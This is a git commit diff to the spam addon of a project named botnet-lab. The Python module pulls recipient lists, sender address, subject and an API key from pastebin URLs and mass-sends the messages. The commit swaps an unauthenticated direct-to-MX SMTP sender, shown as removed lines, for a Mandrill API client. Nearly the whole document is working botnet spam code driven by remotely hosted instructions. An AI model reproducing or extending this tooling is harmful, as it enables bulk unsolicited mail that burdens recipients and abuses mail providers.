58381d836687078f04c44aaad276150ed55dd268
jpdias <jpdias@live.com.pt>
2015-11-25 23:12:37 +0000

    added spam functionality - now working. Update requirements.txt . Needs testing on unix.

--- botnet-lab/addons/spam.py
+++ botnet-lab/addons/spam.py
@@ -1,50 +1,45 @@
-import os
 import urllib2
-from twisted.internet import defer
-from twisted.mail import smtp, relaymanager
-from twisted.internet import reactor
-from cStringIO import StringIO
+import mandrill
 
 
-# mail->http://pastebin.com/raw.php?i=qzCh8DCe-http://pastebin.com/raw.php?i=yCVQS3gx
+# spam->http://pastebin.com/raw.php?i=qzCh8DCe-http://pastebin.com/raw.php?i=AAF54Du3
 # http://pastebin.com/raw.php?i=PRm68quh
 def spam(to_url, msg_url):
+    # print to_url +" "+msg_url
     to_data = urllib2.urlopen(to_url)
+
     msg_data = urllib2.urlopen(msg_url)
     to_list = []
-    msg = ""
+    msgs = ""
     for mail in to_data:
         to_list.append(mail)
     for txt in msg_data:
-        if txt.find('SUBJECT') != -1:
-            sub = txt.split(":")[1]
+        if txt.find('FROM') != -1:
+            fromadd = txt.split(":")[1]
+        elif txt.find('SUBJECT') != -1:
+            subj = txt.split(":")[1]
+        elif txt.find('APIKEY') != -1:
+            apikey = txt.split(":")[1]
         else:
-            msg += txt
-        try:
-            for mail in to_list:
-                MXCALCULATOR = relaymanager.MXCalculator()
-                def getMailExchange(host):
-                    def cbMX(mxRecord):
-                        return str(mxRecord.name)
-                    return MXCALCULATOR.getMX(host).addCallback(cbMX)
+            msgs += txt
+    try:
+        post_mail(to_list, msgs, subj, fromadd, apikey)
+        return "Send"
+    except:
+        raise
+        return "500 NOT OK"
 
-                def sendEmail(mailFrom, mailTo, msg, subject=""):
-                    def dosend(host):
-                        print "emailing %s (using host %s) from %s" % (mailTo, host, mailFrom)
-                        mstring = "From: %s\nTo: %s\nSubject: %s\n\n%s\n"
-                        msgfile = StringIO(mstring % (mailFrom, mailTo, subject, msg))
-                        d = defer.Deferred()
-                        factory = smtp.ESMTPSenderFactory(None, None, mailFrom, mailTo, msgfile, d,
-                                                          requireAuthentication=False,
-                                                          requireTransportSecurity=False)
-                        reactor.connectTCP(host, 25, factory)
-                        return d
-                    return getMailExchange(mailTo.split("@")[1]).addCallback(dosend)
 
-                d = sendEmail('example@live.com', str(mail), msg, sub)
-                d.addCallback(lambda _: reactor.stop())
-                reactor.run()
-
-        except:
-            raise
-            return "500 NOT OK"
+def post_mail(to_list, msgs, subj, fromadd, apikey):
+    mandrill_client = mandrill.Mandrill(apikey.replace("\n", "").replace("\r", ""))
+    message = {
+        'from_email': fromadd,
+        'from_name': 'Name',
+        'html': '<p>' + msgs + '</p>',
+        'important': False,
+        'merge': True,
+        'merge_language': 'mailchimp',
+        'subject': subj,
+        'to': [{'email': ",".join(to_list)}]
+    }
+    mandrill_client.messages.send(message=message, async=False)
